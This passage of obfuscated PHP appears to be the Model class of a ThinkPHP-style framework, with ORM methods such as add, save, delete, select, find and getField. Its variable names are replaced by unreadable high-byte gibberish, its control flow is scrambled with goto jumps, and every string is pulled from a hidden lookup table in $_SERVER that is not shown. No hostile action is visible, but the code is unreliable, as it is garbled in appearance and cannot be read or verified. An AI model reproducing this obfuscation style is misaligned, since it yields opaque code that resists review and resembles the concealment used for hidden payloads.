$this->name = $this->getModelName(); } if (is_null($Aø¯³ê¹®ç)) { $this->tablePrefix = $B‚‚å–êíÑ[33]; } elseif ($B‚‚å–êíÑ[33] != $Aø¯³ê¹®ç) { $this->tablePrefix = $Aø¯³ê¹®ç; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($B‚‚å–êíÑ[242]); } $this->db(0, empty($this->connection) ? $E×‰Û‘†½ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $EØ·ƒÖ‚… =& $_SERVER[ÒÆ›ÆØÎ¾]; if (empty($this->fields)) { if (think_config($EØ·ƒÖ‚…[243])) { $F˜†æ¦âÛ¸ = $this->dbName ? $this->dbName : think_config($EØ·ƒÖ‚…[244]); $a©®Ÿ‡Éí˜ = think_var_cache($EØ·ƒÖ‚…[245] . strtolower(get_path_this($F˜†æ¦âÛ¸) . $EØ·ƒÖ‚…[95] . $this->name)); if ($a©®Ÿ‡Éí˜) { $D‹Ş–Òº = think_config($EØ·ƒÖ‚…[246]); if (empty($D‹Ş–Òº) || $a©®Ÿ‡Éí˜[$EØ·ƒÖ‚…[247]] == $D‹Ş–Òº) { $this->fields = $a©®Ÿ‡Éí˜; return; } } } $this->flush(); } } public function flush() { goto c­½÷ø˜Ç‘; A…—²™Éäğ: if (think_config($e©³„é³™‹[243])) { $B™ù÷Ã¨‘ß = $this->dbName ? $this->dbName : think_config($e©³„é³™‹[244]); think_var_cache($e©³„é³™‹[245] . strtolower(get_path_this($B™ù÷Ã¨‘ß) . $e©³„é³™‹[95] . $this->name), $this->fields); } goto AŸÉìÁ®; Bè³¢ßÉÍ: if (!$B½ÔìóõùÙ) { return !1; } $this->fields = array_keys($B½ÔìóõùÙ); $this->fields[$e©³„é³™‹[248]] = !1; goto Fò¢¼°„­§; Fò¢¼°„­§: foreach ($B½ÔìóõùÙ as $Fø¥°ëÚù® => $dîŒŒŒŒ•ª) { $cäºà‡©Ó²[$Fø¥°ëÚù®] = $dîŒŒŒŒ•ª[$e©³„é³™‹[29]]; if ($dîŒŒŒŒ•ª[$e©³„é³™‹[36]]) { $this->fields[$e©³„é³™‹[249]] = $Fø¥°ëÚù®; if ($dîŒŒŒŒ•ª[$e©³„é³™‹[39]]) { $this->fields[$e©³„é³™‹[248]] = !0; } } } $this->fields[$e©³„é³™‹[250]] = $cäºà‡©Ó²; if (think_config($e©³„é³™‹[246])) { $this->fields[$e©³„é³™‹[247]] = think_config($e©³„é³™‹[246]); } goto A…—²™Éäğ; c­½÷ø˜Ç‘: $e©³„é³™‹ =& $_SERVER[ÒÆ›ÆØÎ¾]; $this->db->setModel($this->name); $B½ÔìóõùÙ = $this->db->getFields($this->getTableName()); goto Bè³¢ßÉÍ; AŸÉìÁ®: } public function switchModel($eœ¥ œ·Ş, $a£Ï™÷¾¶Ü = array()) { $Bá†šÏõ© =& $_SERVER[ÒÆ›ÆØÎ¾]; $f‰…Ğğ˜Ö = ucwords(strtolower($eœ¥ œ·Ş)) . $Bá†šÏõ©[251]; if (!class_exists($f‰…Ğğ˜Ö)) { think_exception($f‰…Ğğ˜Ö . think_lang($Bá†šÏõ©[252])); } $this->_extModel = new $f‰…Ğğ˜Ö($this->name); if (!empty($a£Ï™÷¾¶Ü)) { foreach ($a£Ï™÷¾¶Ü as $B„ğÖÚõ¬Ù) { $this->_extModel->setProperty($B„ğÖÚõ¬Ù, $this->{$B„ğÖÚõ¬Ù}); } } return $this->_extModel; } public function __set($B©ÒÃíšï, $bìóí„†¾æ) { $this->data[$B©ÒÃíšï] = $bìóí„†¾æ; } public function __get($bÀŠº¶Ÿ‘‹) { return isset($this->data[$bÀŠº¶Ÿ‘‹]) ? $this->data[$bÀŠº¶Ÿ‘‹] : null; } public function __isset($CóÓ…ÌÙ‡Ä) { return isset($this->data[$CóÓ…ÌÙ‡Ä]); } public function __unset($b³‰É““ó’) { unset($this->data[$b³‰É““ó’]); } public function __call($fùÌ™»¡ ì, $CœåÍ§„’Ë) { $EøªÄÜ«Æ© =& $_SERVER[ÒÆ›ÆØÎ¾]; if (in_array(strtolower($fùÌ™»¡ ì), $this->methods, !0)) { $this->options[strtolower($fùÌ™»¡ ì)] = $CœåÍ§„’Ë[0]; return $this; } elseif (in_array(strtolower($fùÌ™»¡ ì), array($EøªÄÜ«Æ©[253], $EøªÄÜ«Æ©[254], $EøªÄÜ«Æ©[255], $EøªÄÜ«Æ©[256], $EøªÄÜ«Æ©[257]), !0)) { $eŞÕ¢î¦ò = isset($CœåÍ§„’Ë[0]) ? $CœåÍ§„’Ë[0] : $EøªÄÜ«Æ©[182]; $eŞÕ¢î¦ò = $this->db->parseKey($eŞÕ¢î¦ò); return $this->getField(strtoupper($fùÌ™»¡ ì) . $EøªÄÜ«Æ©[258] . $eŞÕ¢î¦ò . $EøªÄÜ«Æ©[259] . $fùÌ™»¡ ì, $EøªÄÜ«Æ©[253]); } elseif (strtolower(substr($fùÌ™»¡ ì, 0, 5)) == $EøªÄÜ«Æ©[260]) { $eŞÕ¢î¦ò = think_parse_name(substr($fùÌ™»¡ ì, 5)); $eØÆ´ß°‡¤[$eŞÕ¢î¦ò] = $CœåÍ§„’Ë[0]; return $this->where($eØÆ´ß°‡¤)->find(); } elseif (strtolower(substr($fùÌ™»¡ ì, 0, 10)) == $EøªÄÜ«Æ©[261]) { $a˜ËÛí´Î = think_parse_name(substr($fùÌ™»¡ ì, 10)); $eØÆ´ß°‡¤[$a˜ËÛí´Î] = $CœåÍ§„’Ë[0]; return $this->where($eØÆ´ß°‡¤)->getField($CœåÍ§„’Ë[1]); } elseif (isset($this->_scope[$fùÌ™»¡ ì])) { return $this->scope($fùÌ™»¡ ì, $CœåÍ§„’Ë[0]); } elseif (method_exists($this, $fùÌ™»¡ ì)) { array_unshift($CœåÍ§„’Ë, $fùÌ™»¡ ì); return call_user_func_array(array($this, $EøªÄÜ«Æ©[262]), $CœåÍ§„’Ë); } else { return call_user_func_array(array(parent, $fùÌ™»¡ ì), $CœåÍ§„’Ë); } } protected function call() { goto eŒïîŒ; eŒïîŒ: $cï¾Ä×¶’Õ =& $_SERVER[ÒÆ›ÆØÎ¾]; $cš‘›ÓÌ = func_get_args(); $FÊ³ğí = array_shift($cš‘›ÓÌ); goto aÏœÀë‘¸‚; AÕ“ó¹Ò¤ä: $B§¡¦‚‰ªØ = call_user_func_array(array($this, $FÊ³ğí), $cš‘›ÓÌ); if (method_exists($this, $cï¾Ä×¶’Õ[266])) { $dˆùÏÜ™ = call_user_func_array(array($this, $cï¾Ä×¶’Õ[267]), array($EŠ¬ƒõ¶Ñ‚, $cš‘›ÓÌ, $B§¡¦‚‰ªØ)); if ($dˆùÏÜ™) { return $dˆùÏÜ™; } } return $B§¡¦‚‰ªØ; goto cù–ßÁ¨ª¹; CğÛ¿Ä°ó: if (isset($cš‘›ÓÌ[$Bªù—„]) && $cš‘›ÓÌ[$Bªù—„] === $FÊ³ğí) { think_exception(__CLASS__ . $cï¾Ä×¶’Õ[4] . $FÊ³ğí . think_lang($cï¾Ä×¶’Õ[263])); return; } $cš‘›ÓÌ[] = $FÊ³ğí; if (method_exists($this, $cï¾Ä×¶’Õ[264])) { $dˆùÏÜ™ = call_user_func_array(array($this, $cï¾Ä×¶’Õ[265]), array($EŠ¬ƒõ¶Ñ‚, $cš‘›ÓÌ)); if (!is_null($dˆùÏÜ™) && $dˆùÏÜ™ !== !1) { return $dˆùÏÜ™; } } goto AÕ“ó¹Ò¤ä; aÏœÀë‘¸‚: $EŠ¬ƒõ¶Ñ‚ = $FÊ³ğí; if (is_array($FÊ³ğí)) { $EŠ¬ƒõ¶Ñ‚ = $FÊ³ğí[1]; $FÊ³ğí = $FÊ³ğí[0]; } $Bªù—„ = count($cš‘›ÓÌ) - 1; goto CğÛ¿Ä°ó; cù–ßÁ¨ª¹: } protected function _initialize() { } protected function _facade($EÙ‹Óâ¤Ï¨) { $CŠ¡÷íøğø =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!empty($this->fields)) { foreach ($EÙ‹Óâ¤Ï¨ as $FÊÍ•›¼Õ¥ => $Ağ—ØÄÄŸ) { if (is_array($this->fields) && !in_array($FÊÍ•›¼Õ¥, $this->fields, !0)) { unset($EÙ‹Óâ¤Ï¨[$FÊÍ•›¼Õ¥]); } elseif (is_scalar($Ağ—ØÄÄŸ)) { $this->_parseType($EÙ‹Óâ¤Ï¨, $FÊÍ•›¼Õ¥); } } } if (!empty($this->options[$CŠ¡÷íøğø[268]])) { $EÙ‹Óâ¤Ï¨ = array_map($this->options[$CŠ¡÷íøğø[268]], $EÙ‹Óâ¤Ï¨); unset($this->options[$CŠ¡÷íøğø[268]]); } $this->_beforeWrite($EÙ‹Óâ¤Ï¨); return $EÙ‹Óâ¤Ï¨; } protected function _beforeWrite(&$bÆÕâîõÓÑ) { } public function add($e¯¾ëµº = '', $dã†–õÃ«– = array(), $C»£‰ŒãŸ = false) { goto e”éÚ˜•¸¯; BŠÂ‹éƒÇ: if (!1 === $this->_beforeInsert($e¯¾ëµº, $dã†–õÃ«–)) { return !1; } $bÅ‡Şø‹š = $this->db->insert($e¯¾ëµº, $dã†–õÃ«–, $C»£‰ŒãŸ); if (!1 !== $bÅ‡Şø‹š) { $d ¸®£Î§ = $this->getLastInsID(); if ($d ¸®£Î§) { $e¯¾ëµº[$this->getPk()] = $d ¸®£Î§; $this->_after_insert($e¯¾ëµº, $dã†–õÃ«–); return $d ¸®£Î§; } $this->_after_insert($e¯¾ëµº, $dã†–õÃ«–); } goto e‹Òó¡§Ğ; e”éÚ˜•¸¯: if (empty($e¯¾ëµº)) { if (!empty($this->data)) { $e¯¾ëµº = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ÒÆ›ÆØÎ¾][269]); return !1; } } $dã†–õÃ«– = $this->_parseOptions($dã†–õÃ«–); $e¯¾ëµº = $this->_facade($e¯¾ëµº); goto BŠÂ‹éƒÇ; e‹Òó¡§Ğ: return $bÅ‡Şø‹š; goto f‹¼ß‹›ëŞ; f‹¼ß‹›ëŞ: } protected function _beforeInsert(&$bœ¡ò‚À, $bÕ÷¶ãÅ…µ) { } protected function _after_insert($C“Ã×£½Üá, $EÖ‘ÃñÃ—ê) { } public function addAll($bÑÃóÔ§ğõ, $Aù—ù¶ÏÛË = array(), $CšÉ¢Ò½¤ = false) { goto B¼¶µ¤—‰„; B¼¶µ¤—‰„: $eÒ½ÛÖöÀâ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (empty($bÑÃóÔ§ğõ)) { $this->error = think_lang($eÒ½ÛÖöÀâ[269]); return !1; } $Aù—ù¶ÏÛË = $this->_parseOptions($Aù—ù¶ÏÛË); goto eÂİĞ¤Û»Û; CÙËŸâ×¬Ë: return $e•‡¡®Šõä; goto D‚ºƒÌÌµ; eÂİĞ¤Û»Û: foreach ($bÑÃóÔ§ğõ as $Bæ˜è±ÁÅ => $A£Îˆ•±¾ì) { $bÑÃóÔ§ğõ[$Bæ˜è±ÁÅ] = $this->_facade($A£Îˆ•±¾ì); } if (method_exists($this->db, $eÒ½ÛÖöÀâ[270])) { $e•‡¡®Šõä = $this->db->insertAll($bÑÃóÔ§ğõ, $Aù—ù¶ÏÛË, $CšÉ¢Ò½¤); } else { $this->startTrans(); foreach ($bÑÃóÔ§ğõ as $Bæ˜è±ÁÅ => $A£Îˆ•±¾ì) { $e•‡¡®Šõä = $this->db->insert($A£Îˆ•±¾ì, $Aù—ù¶ÏÛË, $CšÉ¢Ò½¤); } $this->commit(); } if (!1 !== $e•‡¡®Šõä) { $e»İ­å»ô = $this->getLastInsID(); if ($e»İ­å»ô) { return $e»İ­å»ô; } } goto CÙËŸâ×¬Ë; D‚ºƒÌÌµ: } public function selectAdd($Fäİ­òÑ†æ = '', $aËœ÷ñÕ´È = '', $d¢×í‰™‰È = array()) { $D‹×ìÎâ³á =& $_SERVER[ÒÆ›ÆØÎ¾]; $d¢×í‰™‰È = $this->_parseOptions($d¢×í‰™‰È); if (!1 === ($CÔİö‡ƒ¬É = $this->db->selectInsert($Fäİ­òÑ†æ ? $Fäİ­òÑ†æ : $d¢×í‰™‰È[$D‹×ìÎâ³á[271]], $aËœ÷ñÕ´È ? $aËœ÷ñÕ´È : $this->getTableName(), $d¢×í‰™‰È))) { $this->error = think_lang($D‹×ìÎâ³á[272]); return !1; } else { return $CÔİö‡ƒ¬É; } } public function save($B–â‚àÁİÊ = '', $cÓó¯¶“šô = array()) { goto bè¹…´‰„; bïø£ÒÏöâ: $cÓó¯¶“šô = $this->_parseOptions($cÓó¯¶“šô); $Bò§Œ×É‘å = $this->getPk(); if (!isset($cÓó¯¶“šô[$cíŒ¡®¦´Ğ[273]])) { if (isset($B–â‚àÁİÊ[$Bò§Œ×É‘å])) { $E’âˆÆ‡¤[$Bò§Œ×É‘å] = $B–â‚àÁİÊ[$Bò§Œ×É‘å]; $cÓó¯¶“šô[$cíŒ¡®¦´Ğ[273]] = $E’âˆÆ‡¤; unset($B–â‚àÁİÊ[$Bò§Œ×É‘å]); } else { $this->error = think_lang($cíŒ¡®¦´Ğ[272]); return !1; } } goto e§µ‘¯Ş; bè¹…´‰„: $cíŒ¡®¦´Ğ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (empty($B–â‚àÁİÊ)) { if (!empty($this->data)) { $B–â‚àÁİÊ = $this->data; $this->data = array(); } else { $this->error = think_lang($cíŒ¡®¦´Ğ[269]); return !1; } } $B–â‚àÁİÊ = $this->_facade($B–â‚àÁİÊ); goto bïø£ÒÏöâ; e§µ‘¯Ş: if (is_array($cÓó¯¶“šô[$cíŒ¡®¦´Ğ[273]]) && isset($cÓó¯¶“šô[$cíŒ¡®¦´Ğ[273]][$Bò§Œ×É‘å])) { $fÊÖó¸Ê›ù = $cÓó¯¶“šô[$cíŒ¡®¦´Ğ[273]][$Bò§Œ×É‘å]; } if (!1 === $this->_beforeUpdate($B–â‚àÁİÊ, $cÓó¯¶“šô)) { return !1; } $a×ÓÂÇ¡Üˆ = $this->db->update($B–â‚àÁİÊ, $cÓó¯¶“šô); goto cæóô¨ªæï; cæóô¨ªæï: if (!1 !== $a×ÓÂÇ¡Üˆ) { if (isset($fÊÖó¸Ê›ù)) { $B–â‚àÁİÊ[$Bò§Œ×É‘å] = $fÊÖó¸Ê›ù; } $this->_afterUpdate($B–â‚àÁİÊ, $cÓó¯¶“šô); } return $a×ÓÂÇ¡Üˆ; goto dôõÛŒ“¬õ; dôõÛŒ“¬õ: } protected function _beforeUpdate(&$b—½Ú¦·éà, $CÈ¹ ŞŠÀØ) { } protected function _afterUpdate($Fá‘×ƒß—, $AÄÇÚ÷²àª) { } public function delete($Aä†½Š•„œ = array()) { goto b¿±â—®ª¿; b¿±â—®ª¿: $d»Ñİ˜í£ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (empty($Aä†½Š•„œ) && empty($this->options[$d»Ñİ˜í£[273]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $bğÉ„½áÑ = $this->getPk(); goto e²¦•ÆÊ¦; e³¡Øîåé: $fŠ±èˆ¡òÍ = $this->db->delete($Aä†½Š•„œ); if (!1 !== $fŠ±èˆ¡òÍ) { $EÛ’Æ¾ÊøÁ = array(); if (isset($eš×¯ª›æŒ)) { $EÛ’Æ¾ÊøÁ[$bğÉ„½áÑ] = $eš×¯ª›æŒ; } $this->_after_delete($EÛ’Æ¾ÊøÁ, $Aä†½Š•„œ); } return $fŠ±èˆ¡òÍ; goto BÆ‡ˆ„¯ÓÚ; e²¦•ÆÊ¦: if (is_numeric($Aä†½Š•„œ) || is_string($Aä†½Š•„œ)) { if (strpos($Aä†½Š•„œ, $d»Ñİ˜í£[47])) { $bÀÜÊ™Äœ[$bğÉ„½áÑ] = array($d»Ñİ˜í£[274], $Aä†½Š•„œ); } else { $bÀÜÊ™Äœ[$bğÉ„½áÑ] = $Aä†½Š•„œ; } $this->options[$d»Ñİ˜í£[273]] = $bÀÜÊ™Äœ; } $Aä†½Š•„œ = $this->_parseOptions(); if (is_array($Aä†½Š•„œ[$d»Ñİ˜í£[273]]) && isset($Aä†½Š•„œ[$d»Ñİ˜í£[273]][$bğÉ„½áÑ])) { $eš×¯ª›æŒ = $Aä†½Š•„œ[$d»Ñİ˜í£[273]][$bğÉ„½áÑ]; } goto e³¡Øîåé; BÆ‡ˆ„¯ÓÚ: } protected function _after_delete($EÈ±•è£Ø, $A´°ñóÇª) { } public function select($Fó¯µšØ¼’ = array()) { goto D«¯˜³§¯½; CöƒãŠ½×¬: $dÃÙ½ôœïÍ = $this->db->select($Fó¯µšØ¼’); if (!1 === $dÃÙ½ôœïÍ) { return !1; } if (empty($dÃÙ½ôœïÍ)) { return null; } goto c«…ˆÜ Ü; D«¯˜³§¯½: $Bë™êğ¢¿¹ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (is_string($Fó¯µšØ¼’) || is_numeric($Fó¯µšØ¼’)) { $c“âô±‚Ñ¡ = $this->getPk(); if (strpos($Fó¯µšØ¼’, $Bë™êğ¢¿¹[47])) { $a­×æÖ¥ó‡[$c“âô±‚Ñ¡] = array($Bë™êğ¢¿¹[274], $Fó¯µšØ¼’); } else { $a­×æÖ¥ó‡[$c“âô±‚Ñ¡] = $Fó¯µšØ¼’; } $this->options[$Bë™êğ¢¿¹[273]] = $a­×æÖ¥ó‡; } elseif (!1 === $Fó¯µšØ¼’) { $Fó¯µšØ¼’ = $this->_parseOptions(); return $Bë™êğ¢¿¹[275] . $this->db->buildSelectSql($Fó¯µšØ¼’) . $Bë™êğ¢¿¹[276]; } $Fó¯µšØ¼’ = $this->_parseOptions(); goto CöƒãŠ½×¬; c«…ˆÜ Ü: $this->_afterSelect($dÃÙ½ôœïÍ, $Fó¯µšØ¼’); return $dÃÙ½ôœïÍ; goto Dƒ–‡æì‹; Dƒ–‡æì‹: } protected function _afterSelect(&$CÖëñÇóÇî, $c§àŠ£¦àî) { } public function buildSql($D‹”«ÈÜ¿¿ = array()) { $b›ô»Øº—£ =& $_SERVER[ÒÆ›ÆØÎ¾]; $D‹”«ÈÜ¿¿ = $this->_parseOptions($D‹”«ÈÜ¿¿); return $b›ô»Øº—£[275] . $this->db->buildSelectSql($D‹”«ÈÜ¿¿) . $b›ô»Øº—£[276]; } public function optionsValue($d¨«ì¾‡ = null) { if (is_null($d¨«ì¾‡)) { return $this->options; } elseif (is_array($d¨«ì¾‡)) { $this->options = array_merge($this->options, $d¨«ì¾‡); } } protected function _parseOptions($B¥åÏˆ•±Ú = array()) { goto cÌç‹´¬Ì‘; e¶º‹ë–‘Ë: if (!isset($B¥åÏˆ•±Ú[$e¥õÊÁ½İ[277]])) { $B¥åÏˆ•±Ú[$e¥õÊÁ½İ[277]] = $this->getTableName(); $dÄ÷‹²° = $this->fields; } else { $dÄ÷‹²° = $this->getDbFields(); } if (!empty($B¥åÏˆ•±Ú[$e¥õÊÁ½İ[278]])) { $B¥åÏˆ•±Ú[$e¥õÊÁ½İ[277]] .= $e¥õÊÁ½İ[50] . $B¥åÏˆ•±Ú[$e¥õÊÁ½İ[278]]; } $B¥åÏˆ•±Ú[$e¥õÊÁ½İ[279]] = $this->name; goto a„ñâÊ¦Äì; a„ñâÊ¦Äì: if (isset($B¥åÏˆ•±Ú[$e¥õÊÁ½İ[273]]) && is_array($B¥åÏˆ•±Ú[$e¥õÊÁ½İ[273]]) && !empty($dÄ÷‹²°) && !isset($B¥åÏˆ•±Ú[$e¥õÊÁ½İ[280]]) && !isset($B¥åÏˆ•±Ú[$e¥õÊÁ½İ[277]])) { foreach ($B¥åÏˆ•±Ú[$e¥õÊÁ½İ[273]] as $Cç®ÊİåÁï => $B’ç…é‹†³) { $Cç®ÊİåÁï = trim($Cç®ÊİåÁï); if (in_array($Cç®ÊİåÁï, $dÄ÷‹²°, !0)) { if (is_scalar($B’ç…é‹†³)) { $this->_parseType($B¥åÏˆ•±Ú[$e¥õÊÁ½İ[273]], $Cç®ÊİåÁï); } } elseif (!is_numeric($Cç®ÊİåÁï) && $e¥õÊÁ½İ[71] != substr($Cç®ÊİåÁï, 0, 1) && !1 === strpos($Cç®ÊİåÁï, $e¥õÊÁ½İ[95]) && !1 === strpos($Cç®ÊİåÁï, $e¥õÊÁ½İ[258]) && !1 === strpos($Cç®ÊİåÁï, $e¥õÊÁ½İ[281]) && !1 === strpos($Cç®ÊİåÁï, $e¥õÊÁ½İ[282])) { unset($B¥åÏˆ•±Ú[$e¥õÊÁ½İ[273]][$Cç®ÊİåÁï]); } } } $this->_options_filter($B¥åÏˆ•±Ú); return $B¥åÏˆ•±Ú; goto e¥á”ĞÕë³; cÌç‹´¬Ì‘: $e¥õÊÁ½İ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (is_array($B¥åÏˆ•±Ú)) { $B¥åÏˆ•±Ú = array_merge($this->options, $B¥åÏˆ•±Ú); } $this->options = array(); goto e¶º‹ë–‘Ë; e¥á”ĞÕë³: } protected function _options_filter(&$EÙáÙšÎ‰) { } protected function _parseType(&$B®˜ƒåİã, $f£‚ù’Ş•÷) { $a¨øÉˆ®Çœ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (empty($this->options[$a¨øÉˆ®Çœ[283]][$a¨øÉˆ®Çœ[4] . $f£‚ù’Ş•÷])) { $F¸‹Äæ¥© = strtolower($this->fields[$a¨øÉˆ®Çœ[250]][$f£‚ù’Ş•÷]); if (!1 !== strpos($F¸‹Äæ¥©, $a¨øÉˆ®Çœ[284])) { } elseif (!1 === strpos($F¸‹Äæ¥©, $a¨øÉˆ®Çœ[285]) && !1 !== strpos($F¸‹Äæ¥©, $a¨øÉˆ®Çœ[286])) { $B®˜ƒåİã[$f£‚ù’Ş•÷] = intval($B®˜ƒåİã[$f£‚ù’Ş•÷]); } elseif (!1 !== strpos($F¸‹Äæ¥©, $a¨øÉˆ®Çœ[287]) || !1 !== strpos($F¸‹Äæ¥©, $a¨øÉˆ®Çœ[288])) { $B®˜ƒåİã[$f£‚ù’Ş•÷] = floatval($B®˜ƒåİã[$f£‚ù’Ş•÷]); } elseif (!1 !== strpos($F¸‹Äæ¥©, $a¨øÉˆ®Çœ[289])) { $B®˜ƒåİã[$f£‚ù’Ş•÷] = (bool) $B®˜ƒåİã[$f£‚ù’Ş•÷]; } } } public function find($F·¤†Ã£À = array()) { goto Aãö¬Ëİ; Aãö¬Ëİ: $fƒ¥ôÓ‰£ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (is_numeric($F·¤†Ã£À) || is_string($F·¤†Ã£À)) { $EˆĞÀà£õí[$this->getPk()] = intval($F·¤†Ã£À); $this->options[$fƒ¥ôÓ‰£[273]] = $EˆĞÀà£õí; } $this->options[$fƒ¥ôÓ‰£[290]] = 1; goto dˆŸ¼±‹§Â; b÷ê™ÚËÛ¢: if (empty($AŒ¦ÕéËÆ)) { return null; } $this->data = $AŒ¦ÕéËÆ[0]; $this->_afterFind($this->data, $F·¤†Ã£À); goto a§×èï¿©; dˆŸ¼±‹§Â: $F·¤†Ã£À = $this->_parseOptions(); $AŒ¦ÕéËÆ = $this->db->select($F·¤†Ã£À); if (!1 === $AŒ¦ÕéËÆ) { return !1; } goto b÷ê™ÚËÛ¢; a§×èï¿©: if (!empty($this->options[$fƒ¥ôÓ‰£[291]])) { return $this->returnResult($this->data, $this->options[$fƒ¥ôÓ‰£[291]]); } return $this->data; goto DÕ§»Î¦Èº; DÕ§»Î¦Èº: } protected function _afterFind(&$F«‹çÁÛŞ², $c–ñÓÃñ) { } protected function returnResult($A…ïİ“, $A×šµ© = '') { $Eå¹õï¸ãá =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($A×šµ©) { if (is_callable($A×šµ©)) { return call_user_func($A×šµ©, $A…ïİ“); } switch (strtolower($A×šµ©)) { case $Eå¹õï¸ãá[292]: return json_encode($A…ïİ“); case $Eå¹õï¸ãá[293]: return xml_encode($A…ïİ“); } } return $A…ïİ“; } public function parseFieldsMap($fì×ÓÖ´÷–, $A…š¼õ¦„ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $c™š³° „ => $D×Ÿí› Í) { if ($A…š¼õ¦„ == 1) { if (isset($fì×ÓÖ´÷–[$D×Ÿí› Í])) { $fì×ÓÖ´÷–[$c™š³° „] = $fì×ÓÖ´÷–[$D×Ÿí› Í]; unset($fì×ÓÖ´÷–[$D×Ÿí› Í]); } } else { if (isset($fì×ÓÖ´÷–[$c™š³° „])) { $fì×ÓÖ´÷–[$D×Ÿí› Í] = $fì×ÓÖ´÷–[$c™š³° „]; unset($fì×ÓÖ´÷–[$c™š³° „]); } } } } return $fì×ÓÖ´÷–; } public function setField($Cçñç×…¼, $b»âÈ§³•³ = '') { if (is_array($Cçñç×…¼)) { $bœ¾ä©©íÕ = $Cçñç×…¼; } else { $bœ¾ä©©íÕ[$Cçñç×…¼] = $b»âÈ§³•³; } return $this->save($bœ¾ä©©íÕ); } public function setAdd($A¤õ¼°Ü, $e·³‚ä¡º = 1) { $fÖá³ï–íŸ =& $_SERVER[ÒÆ›ÆØÎ¾]; $DÏ¥ŒÜŞÁ = $A¤õ¼°Ü . $fÖá³ï–íŸ[294] . $e·³‚ä¡º; if ($e·³‚ä¡º < 0) { $DÏ¥ŒÜŞÁ = $A¤õ¼°Ü . $e·³‚ä¡º; } return $this->setField($A¤õ¼°Ü, array($fÖá³ï–íŸ[295], $DÏ¥ŒÜŞÁ)); } public function getField($AÍ·¦¸õ¶õ, $AĞ¬‰²÷ŠÈ = null) { $EŸÚ•ÆÍ†Š =& $_SERVER[ÒÆ›ÆØÎ¾]; $BâõÔ¸ÃÄÊ[$EŸÚ•ÆÍ†Š[271]] = $AÍ·¦¸õ¶õ; $BâõÔ¸ÃÄÊ = $this->_parseOptions($BâõÔ¸ÃÄÊ); $AÍ·¦¸õ¶õ = trim($AÍ·¦¸õ¶õ); if (strpos($AÍ·¦¸õ¶õ, $EŸÚ•ÆÍ†Š[47])) { if (!isset($BâõÔ¸ÃÄÊ[$EŸÚ•ÆÍ†Š[290]])) { $BâõÔ¸ÃÄÊ[$EŸÚ•ÆÍ†Š[290]] = is_numeric($AĞ¬‰²÷ŠÈ) ? $AĞ¬‰²÷ŠÈ : $EŸÚ•ÆÍ†Š[33]; } $FàÇĞì†ù = $this->db->select($BâõÔ¸ÃÄÊ); if (!empty($FàÇĞì†ù)) { goto bÜÙÓ®§½; bÜÙÓ®§½: $d’Ñœ–³† = explode($EŸÚ•ÆÍ†Š[47], $AÍ·¦¸õ¶õ); $AÍ·¦¸õ¶õ = array_keys($FàÇĞì†ù[0]); $e¡êÅ¡¨œ = array_shift($AÍ·¦¸õ¶õ); goto dŠÉÀŠ´; cÁ»Ñîç…¢: foreach ($FàÇĞì†ù as $aêñµºÛ‘½) { $A™ÊçÁ¬£ = $aêñµºÛ‘½[$e¡êÅ¡¨œ]; if (2 == $F½¤æ×éº¡) { $aÏŒœ¥æÈ[$A™ÊçÁ¬£] = $aêñµºÛ‘½[$EñË®Ÿ¬Õ]; } else { $aÏŒœ¥æÈ[$A™ÊçÁ¬£] = is_string($AĞ¬‰²÷ŠÈ) ? implode($AĞ¬‰²÷ŠÈ, $aêñµºÛ‘½) : $aêñµºÛ‘½; } } return $aÏŒœ¥æÈ; goto EÏ±Ê–Ä“; dŠÉÀŠ´: $EñË®Ÿ¬Õ = array_shift($AÍ·¦¸õ¶õ); $aÏŒœ¥æÈ = array(); $F½¤æ×éº¡ = count($d’Ñœ–³†); goto cÁ»Ñîç…¢; EÏ±Ê–Ä“: } } else { if (!0 !== $AĞ¬‰²÷ŠÈ) { $BâõÔ¸ÃÄÊ[$EŸÚ•ÆÍ†Š[290]] = is_numeric($AĞ¬‰²÷ŠÈ) ? $AĞ¬‰²÷ŠÈ : 1; } if ($AĞ¬‰²÷ŠÈ === $EŸÚ•ÆÍ†Š[253]) { unset($BâõÔ¸ÃÄÊ[$EŸÚ•ÆÍ†Š[290]]); } $aêñµºÛ‘½ = $this->db->select($BâõÔ¸ÃÄÊ); if (!empty($aêñµºÛ‘½)) { if ($AĞ¬‰²÷ŠÈ === $EŸÚ•ÆÍ†Š[253]) { return reset($aêñµºÛ‘½[0]); } if (!0 !== $AĞ¬‰²÷ŠÈ && 1 == $BâõÔ¸ÃÄÊ[$EŸÚ•ÆÍ†Š[290]]) { return reset($aêñµºÛ‘½[0]); } foreach ($aêñµºÛ‘½ as $cØ©ßÖÒĞë) { $C‹ò°¬Œ‰¥[] = $cØ©ßÖÒĞë[$AÍ·¦¸õ¶õ]; } return $C‹ò°¬Œ‰¥; } } return null; } public function create($eêİ¤¶ÆÏ = '', $aï¿–‹‡Œ = '') { goto AÆÍÀ£Ñó; f²£¨‡ğêø: $eêİ¤¶ÆÏ = $this->parseFieldsMap($eêİ¤¶ÆÏ, 0); $aï¿–‹‡Œ = $aï¿–‹‡Œ ? $aï¿–‹‡Œ : (!empty($eêİ¤¶ÆÏ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$Bçßš•¹ º[271]])) { $c¢Áôë’ğ = $this->options[$Bçßš•¹ º[271]]; unset($this->options[$Bçßš•¹ º[271]]); } elseif ($aï¿–‹‡Œ == THINK_MODEL_INSERT && isset($this->insertFields)) { $c¢Áôë’ğ = $this->insertFields; } elseif ($aï¿–‹‡Œ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $c¢Áôë’ğ = $this->updateFields; } goto aœ …ó‚‡; eŒ†ïŠä»: if ($this->autoCheckFields) { $c¢Áôë’ğ = $this->getDbFields(); foreach ($eêİ¤¶ÆÏ as $CÚõñÅà¼ => 